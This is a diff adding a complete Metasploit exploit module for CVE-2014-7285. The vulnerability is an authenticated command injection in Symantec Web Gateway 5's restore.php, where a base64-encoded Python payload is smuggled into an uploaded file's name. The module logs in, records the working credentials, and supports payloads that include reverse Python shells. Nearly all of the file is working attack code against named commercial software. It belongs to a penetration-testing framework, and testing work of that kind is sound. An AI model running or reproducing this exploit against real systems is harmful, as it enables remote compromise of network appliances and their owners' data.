@@ -1,0 +1,243 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Symantec Web Gateway 5 restore.php Post Authentication Command Injection",
+      'Description'    => %q{
+          This module exploits a command injection vulnerability found in Symantec Web
+        Gateway's setting restoration feature. The filename portion can be used to inject
+        system commands into a syscall function, and gain control under the context of
+        HTTP service.
+
+        For Symantec Web Gateway 5.1.1, you can exploit this vulnerability by any kind of user.
+        However, for version 5.2.1, you must be an administrator.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Egidio Romano', # Original discovery & assist of MSF module
+          'sinn3r'
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2014-7285' ],
+          [ 'OSVDB', '116009' ],
+          [ 'BID', '71620' ],
+          [ 'URL', 'http://karmainsecurity.com/KIS-2014-19' ],
+          [ 'URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20141216_00']
+        ],
+      'Payload'        =>
+        {
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic python'
+            }
+        },
+      'DefaultOptions' => {
+        'RPORT'      => 443,
+        'SSL'        => true,
+        'SSLVersion' => 'TLS1'
+      },
+      'Platform'       => ['unix'],
+      'Arch'           => ARCH_CMD,
+      'Targets'        =>
+        [
+          ['Symantec Web Gateway 5', {}]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "Dec 16 2014", # Symantec security bulletin (Vendor notified on 8/10/2014)
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The URI to Symantec Web Gateway', '/']),
+        OptString.new('USERNAME', [true, 'The username to login as']),
+        OptString.new('PASSWORD', [true, 'The password for the username'])
+      ], self.class)
+  end
+
+  def protocol
+    ssl ? 'https' : 'http'
+  end
+
+  def check
+    uri = target_uri.path
+    res = send_request_cgi({'uri' => normalize_uri(uri, 'spywall/login.php')})
+
+    if res && res.body.include?('Symantec Web Gateway')
+      return Exploit::CheckCode::Detected
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def get_sid
+    sid = ''
+
+    uri = target_uri.path
+    res = send_request_cgi({
+      'uri'    => normalize_uri(uri, 'spywall/login.php'),
+      'method' => 'GET',
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'Connection timed out while retrieving PHPSESSID')
+    end
+
+    cookies = res.get_cookies
+    sid = cookies.scan(/(PHPSESSID=\w+);*/).flatten[0] || ''
+
+    sid
+  end
+
+  def login(sid)
+    uri = target_uri.path
+    res = send_request_cgi({
+      'uri'    => normalize_uri(uri, 'spywall/login.php'),
+      'method' => 'POST',
+      'cookie' => sid,
+      'headers' => {
+        'Referer' => "#{protocol}://#{peer}/#{normalize_uri(uri, 'spywall/login.php')}"
+      },
+      'vars_post' => {
+        'USERNAME' => datastore['USERNAME'],
+        'PASSWORD' => datastore['PASSWORD'],
+        'loginBtn' => 'Login'
+      }
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'Connection timed out while attempting to login')
+    end
+
+    cookies = res.get_cookies
+    sid = cookies.scan(/(PHPSESSID=\w+);*/).flatten[0] || ''
+
+    if res.headers['Location'] =~ /executive_summary\.php$/ && !sid.blank?
+      # Successful login
+      return sid
+    else
+      # Failed login
+      fail_with(Failure::NoAccess, "Bad username or password: #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+    end
+  end
+
+  def build_payload
+    # At of today (Feb 27 2015), there are only three payloads this module will support:
+    # * cmd/unix/generic
+    # * cmd/unix/reverse_python
+    # * cmd/unix/reverse_python_ssl
+    p = payload.encoded
+
+    case datastore['PAYLOAD']
+    when /cmd\/unix\/generic/
+      # Filter that one out, Mr. basename()
+      p = Rex::Text.encode_base64("import os ; os.system('#{Rex::Text.encode_base64(p)}'.decode('base64'))")
+      p = "python -c \"exec('#{p}'.decode('base64'))\""
+    else
+      p = p.gsub(/python -c "exec/, 'python -c \\"exec')
+      p = p.gsub(/decode\('base64'\)\)"/, "decode('base64'))\\\"")
+    end
+
+    p
+  end
+
+  def build_mime
+    p = build_payload
+
+    data = Rex::MIME::Message.new
+    data.add_part("#{Time.now.to_i}", nil, nil, 'form-data; name="posttime"')
+    data.add_part('maintenance', nil, nil, 'form-data; name="configuration"')
+    data.add_part('', 'application/octet-stream', nil, 'form-data; name="licenseFile"; filename=""')
+    data.add_part('24', nil, nil, 'form-data; name="raCloseInterval"')
+    data.add_part('', nil, nil, 'form-data; name="restore"')
+    data.add_part("#{Rex::Text.rand_text_alpha(4)}\n", 'text/plain', nil, "form-data; name=\"restore_file\"; filename=\"#{Rex::Text.rand_text_alpha(4)}.txt; #{p}\"")
+    data.add_part('Restore', nil, nil, 'form-data; name="restoreFile"')
+    data.add_part('0', nil, nil, 'form-data; name="event_horizon"')
+    data.add_part('0', nil, nil, 'form-data; name="max_events"')
+    data.add_part(Time.now.strftime("%m/%d/%Y"), nil, nil, 'form-data; name="cleanlogbefore"')
+    data.add_part('', nil, nil, 'form-data; name="testaddress"')
+    data.add_part('', nil, nil, 'form-data; name="pingaddress"')
+    data.add_part('and', nil, nil, 'form-data; name="capture_filter_op"')
+    data.add_part('', nil, nil, 'form-data; name="capture_filter"')
+
+    data
+  end
+
+  def inject_exec(sid)
+    uri = target_uri.path
+    mime = build_mime # Payload inside
+    send_request_cgi({
+      'uri'     => normalize_uri(uri, 'spywall/restore.php'),
+      'method'  => 'POST',
+      'cookie'  => sid,
+      'data'    => mime.to_s,
+      'ctype'   => "multipart/form-data; boundary=#{mime.bound}",
+      'headers' => {
+        'Referer' => "#{protocol}://#{peer}#{normalize_uri(uri, 'spywall/mtceConfig.php')}"
+      }
+    })
+  end
+
+  def save_cred(username, password)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: protocol,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      username: username,
+      private_data: password,
+      private_type: :password
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      last_attempted_at: DateTime.now,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+  def exploit
+    print_status("Getting the PHPSESSID...")
+    sid = get_sid
+    if sid.blank?
+      print_error("Failed to get the session ID. Cannot continue with the login.")
+      return
+    end
+
+    print_status("Attempting to log in as #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+    sid = login(sid)
+    if sid.blank?
+      print_error("Failed to get the session ID from the login process. Cannot continue with the injection.")
+      return
+    else
+      # Good password, keep it
+      save_cred(datastore['USERNAME'], datastore['PASSWORD'])
+    end
+
+    print_status("Trying restore.php...")
+    inject_exec(sid)
+  end
+
+end
